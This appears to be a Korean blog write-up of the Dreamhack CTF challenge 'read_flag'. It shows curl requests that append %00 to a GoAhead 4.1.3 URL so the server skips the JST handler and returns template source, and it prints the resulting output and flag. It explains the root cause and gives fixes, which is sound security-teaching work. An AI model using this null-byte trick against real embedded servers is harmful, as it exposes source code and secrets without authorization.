---
layout: post
title:  "Dreamhack 워게임 read_flag 풀이 — Goahead 4.1.3 null-byte 트릭으로 JST 템플릿 소스 유출 (CVE-2021-42342 계열)"
date:   2026-05-19 22:30:00 +0900
categories: security web wargame dreamhack writeup goahead jst source-disclosure null-byte
---

## 들어가며

Dreamhack 웹해킹 워게임 **read_flag** (난이도 별 1, 풀이자 407명) 풀이입니다. 임베디드 시스템에서 자주 보이는 작은 웹 서버 **GoAhead v4.1.3** 의 라우팅과 핸들러 매칭에 끼어드는 **null-byte 트릭** 으로 .jst 템플릿 소스를 그대로 읽어내는 문제. C 로 짠 서버가 URL 처리에서 C-string 의 함정에 빠지는 클래식한 패턴입니다.

문제 설명:

> 웹 서버 Goahead v4.1.3을 사용하는 웹 서비스 입니다.
> 템플릿의 주석에 숨겨진 FLAG를 획득하세요.

스포일러 결론(요약):

```bash
SERVER="http://host3.dreamhack.games:PORT"

# 정상 요청은 JST 핸들러가 템플릿을 "실행" 해서 주석을 출력 안 함
curl "$SERVER/jst/flag.jst"
#   ...
#   read me   ← JST 안의 write("read me"/*FLAG*/) 결과만 보임

# 끝에 %00 (null byte) 한 글자만 더하면 source 가 그대로 노출됨
curl "$SERVER/jst/flag.jst%00"
#   ...
#   <% write("read me"/*this is flag DH{703ab75ab49d02bd4d7abdcb4e7ba39c}*/); %>
```

**`%00` 한 글자가 라우팅 매칭(=문자열 비교) 과 파일 읽기(=C-string 처리) 의 의미를 다르게 만든다** — 이게 이 문제의 한 줄 요약.

## 1. 자료 파악

ZIP 안 구조:

```
readflag/
├── Dockerfile          (ubuntu:18.04 + goahead v4.1.3 source build)
└── deploy/
    ├── start.sh        (goahead --log ... /var/www/goahead)
    ├── goahead/route.txt
    └── www/
        ├── index.html
        └── jst/
            ├── index.jst
            └── flag.jst   ← 여기에 flag 가 주석으로 박혀 있음
```

### 1.1 라우팅 설정 (`route.txt`)

```
route uri=/jst extensions=jst handler=jst
route uri=/
```

GoAhead 의 route 파일 문법으로 두 가지 규칙이 정의돼 있습니다:

1. `/jst` 로 시작하면서 확장자가 `jst` 인 요청 → **`jst` 핸들러** (서버사이드 JS 실행).
2. 그 외 모든 요청 (`uri=/`) → **기본 핸들러** (정적 파일 그대로 서빙).

### 1.2 우리가 노리는 파일 (`flag.jst`)

```jst
<html>
    <body>
        <h1>Can you see flag?</h1>
        <% write("read me"/*this is flag [**FLAG**]*/); %>
    </body>
</html>
```

`<% ... %>` 가 GoAhead 의 JST(JavaScript Template) 블록. 내부의 `write("read me"/*...*/)` 는 JavaScript 호출이고, `/*...*/` 는 그냥 JS 주석. 핸들러가 정상 실행하면:

- `write("read me")` 호출 → `read me` 가 출력 버퍼에 기록
- 주석은 파싱은 되지만 무시되어 클라이언트에 안 보임

→ 정상 응답에선 `read me` 만 나옴. **소스에 숨어 있는 주석(flag) 을 보려면 핸들러가 실행되기 전 = 소스 그대로 받아야** 합니다.

## 2. 1차 가설 — 핸들러 매칭을 회피하면 정적 파일로 떨어진다

GoAhead 의 라우팅은 위에서 본 두 줄이 전부. 1번 규칙에 매칭되지 않으면 2번 규칙(정적)으로 떨어지고, 정적 핸들러는 .jst 든 .txt 든 가리지 않고 **파일 내용 그대로** 응답해 줍니다. 그러면:

- 1번 규칙은 "URI 가 `/jst` 로 시작" + "확장자가 `jst`" 두 조건.
- 둘 중 하나라도 어긋나게 만들면 → 2번으로 fallback → source disclosure.

### 2.1 흔한 회피 후보 시험

```bash
curl "$SERVER/jst/flag.JST"          # 대문자
# → Document Error: Not Found
curl "$SERVER/jst/flag.jst/"         # 끝 슬래시
# → Document Error: Not Found
curl "$SERVER/jst/../jst/flag.jst"   # path traversal
# → 그냥 정상 실행 (read me)
```

흥미로운 점:

- 대문자/슬래시는 **둘 다 404**. 1번 규칙은 빠져나갔지만 2번(정적) 도 매칭이 안 됨. GoAhead 가 정규화(normalize) 한 뒤 라우트 매칭 + 파일 lookup 을 하는데, 그 normalize 가 잘못된 확장자/경로를 처리 못 한 듯.
- path traversal 은 normalize 가 잘 들어가서 원래 경로로 풀려버림.

여기서 막힐 수 있지만, 다음 후보가 결정타.

### 2.2 `%00` (null byte) 트릭

```bash
curl "$SERVER/jst/flag.jst%00"
```

응답:

```html
<html>
    <body>
        <h1>Can you see flag?</h1>
        <% write("read me"/*this is flag DH{703ab75ab49d02bd4d7abdcb4e7ba39c}*/); %>
    </body>
</html>
```

**소스 그대로 응답** ✅. flag 획득.

## 3. 왜 `%00` 가 통하는가 — C-string vs 라우트 비교

GoAhead 는 C 로 짠 서버입니다. C 의 문자열은 **null-terminated** — `\0` 을 만나면 문자열이 끝난 것으로 간주됩니다.

서버 내부 처리를 추정해 보면:

1. **URL 디코드**: `%00` → 실제 `\0` 바이트.
2. **route 매칭 단계**: URI 와 확장자 비교에 GoAhead 가 라이브러리 비교 함수를 쓰는데, 이때 **`\0` 이전까지만 보는 strcmp/strstr 같은 함수** 를 쓰면 확장자가 `jst` + `\0` 으로 인식 → 1번 규칙 매칭 됨? 아니면 그 반대로 **`\0` 까지 포함한 길이로 비교** 해서 매칭 실패?

이 문제에서는 **매칭이 실패** 했습니다. 이유는 GoAhead 가 path/extension 비교를 할 때 `\0` 을 그대로 데이터의 일부로 취급해서 `jst != jst\0` 으로 봤거나, 또는 `\0` 뒤가 빈 확장자라고 판단해서 1번 규칙에 안 걸렸기 때문으로 보입니다.

3. **파일 lookup 단계**: GoAhead 가 `/var/www/goahead` + URI 를 합쳐 `open()`/`stat()` 호출. **`open(path)` 같은 syscall 은 C string** 을 받고 → **`\0` 에서 끝남** → 실제로는 `/var/www/goahead/jst/flag.jst` 가 열림 → flag.jst 소스 그대로 응답.

즉 같은 URL 안의 `%00` 을 **라우트 비교는 데이터로**, **파일 시스템 호출은 종결자로** 해석하면서 **두 컴포넌트의 의미가 어긋난** 것. 이게 클래식한 **"path canonicalization vs filesystem boundary mismatch"** 패턴입니다.

> 비유: 회사 문서함 자물쇠는 "*.jst" 가 적힌 봉투만 잠가놓고, 안에 들어 있는 종이 자체는 평범한 종이. 봉투에 "flag.jst\0" 이라고 쓰면 자물쇠 시스템은 "확장자가 jst 가 아니네?" 라고 그냥 통과시키는데, 그 자물쇠 너머의 사람은 "아 flag.jst 군요" 하고 안 종이를 꺼내 주는 식.

### 3.1 비교 정리

| 단계 | 본 것 | 입력에 대한 해석 |
|---|---|---|
| URL 디코드 | `/jst/flag.jst%00` → `/jst/flag.jst\0` | 단순 디코드 |
| Route 매칭 (`uri=/jst extensions=jst`) | "확장자가 `jst\0` 또는 비어 있음" | 매칭 실패 → 1번 규칙 skip |
| Route 매칭 (`uri=/`) | "URI 가 `/` 로 시작" | 매칭 성공 → 정적 핸들러 |
| 정적 파일 lookup (open, stat) | `/var/www/goahead/jst/flag.jst\0` | C-string → `\0` 에서 잘림 → `flag.jst` open OK |
| 응답 | 파일 내용 raw 송출 | flag 노출 |

## 4. 안전하게 고치기

### 4.1 GoAhead 측 (라이브러리)

- 비교에 사용하는 모든 데이터를 **명시적 길이** 로 다루기 (`strncmp` 대신 길이 인자가 있는 비교, `memcmp` 등) — 이미 GoAhead 는 `goahead-archive` 의 4.1.3.1 패치에서 이 부분을 손봤습니다. Dockerfile 의 주석:
  ```
  ### Todo: Switch to the patched version.
  ### RUN git checkout v4.1.3.1
  ```
  그대로 4.1.3.1 로 올리면 이 트릭이 막힙니다.
- URL 디코드 단계에서 `%00` 같은 **제어 문자 자체를 거부** (400 으로 응답) 하는 것도 일반적인 hardening.

### 4.2 운영 측 (애플리케이션)

- **소스에 비밀을 박지 말 것**. flag/credentials 는 환경 변수, KMS, vault 등 외부 비밀 저장소로. 소스 disclosure 한 번에 모든 비밀이 빠져나가는 구조는 단일 실패점.
- 정적 핸들러가 **소스/스크립트 파일을 절대 못 서빙하게** 차단:
  ```
  route uri=/ deny=*.jst,*.php,*.py
  ```
  같은 식의 명시적 deny list 또는 `.htaccess`-style 룰.

### 4.3 일반 원칙

- **데이터 vs 종결자/메타** 의 해석 차이는 거의 모든 injection 패밀리의 뿌리.
  - SQL: `';` (쿼리 메타)
  - Path: `..`, `\0`, NTFS ADS `::$DATA`
  - HTTP: CRLF, smuggling
  - JSON/XML: 중복 키, comment 노드

## 5. 한 번 더 정리

### 5.1 취약점 카탈로그

| 단계 | 카테고리 | 원인 |
|---|---|---|
| `%00` 라우트 우회 | Path Confusion / Source Disclosure (CWE-540) | URL 디코드 후 C-string 처리 일관성 결여 |
| 정적 핸들러가 .jst 서빙 | Improper Access Control | 위험한 확장자 deny 룰 없음 |
| 소스에 flag 박힘 | Hardcoded Secret (CWE-798) | 비밀을 코드 안에 직접 보관 |

### 5.2 입문자가 챙겨가면 좋은 시각

- 모든 매칭 로직(라우팅, 권한 검사, 화이트리스트)을 볼 때 **"이 비교를 통과한 문자열이, 이후 어떤 함수에서 다시 해석되는가?"** 를 의식적으로 추적하자. 두 해석이 다르면 거의 항상 사고가 난다.
- 임베디드 웹 서버(GoAhead, Boa, lighttpd 일부 모드, mini_httpd, mongoose 등) 는 단순함을 위해 보안 패치가 늦거나 비활성화되는 경우가 흔하다. 출제자가 굳이 "GoAhead 4.1.3" 라고 버전을 박았다면, **그 버전 ± 0.0.1 사이의 CVE 를 우선 검토** 하는 게 정공법.

## 6. 시도했지만 실패한 것들 (회고)

이번 회차는 두 번째 시도에서 풀려서 헛수고가 거의 없었지만, 시도 순서는 기록해 둡니다.

### 6.1 시도 1 — 대문자 확장자 / 트레일링 슬래시

`/jst/flag.JST` 와 `/jst/flag.jst/` 모두 Document Not Found. **라우트 1번을 피하긴 했지만 라우트 2번에도 매칭이 안 되는** 어색한 결과가 나왔음. 여기서 "static 으로 떨어지면 그 이름의 파일을 lookup 할 텐데 normalize 가 깨졌다" 정도로 판단하고 다른 회피 후보로 이동.

**회고**: GoAhead 같은 C 서버를 만나면 첫 시도부터 `%00`, `%2e`, `%2f`, 백슬래시, CR/LF 같은 **byte-level 트릭** 을 우선순위 위로 올리는 게 좋다. 대소문자/슬래시는 일반 HTTP 서버 우회 후보지 임베디드 C 서버에선 잘 안 됨.

### 6.2 시도 2 — `..` path traversal

`/jst/../jst/flag.jst` 는 GoAhead 가 `..` 를 정규화해서 그대로 원래 라우트로 흘러갔음 — JST 핸들러가 정상 실행되어 `read me` 만 응답. **정규화 단계에서 발이 묶이는 케이스**. 만약 정규화가 라우트 매칭 전에만 적용되고 파일 lookup 전엔 다시 적용되지 않았다면 유효했을 수도 있는데, GoAhead 는 그 둘이 일관됐음.

### 6.3 시도 3 — `%00` 추가 ✅

세 번째 시도에서 정답. 위 분석대로 라우트 매칭과 파일 lookup 의 해석 차이를 노린 케이스.

---

C 로 짠 작은 웹서버를 만나면 **null-byte / 인코딩 트릭 우선** 으로 시도해 보세요. JST/PHP/JSP 가리지 않고 "확장자 매칭 → 핸들러 dispatch" 구조에서 같은 패턴이 자주 보입니다.
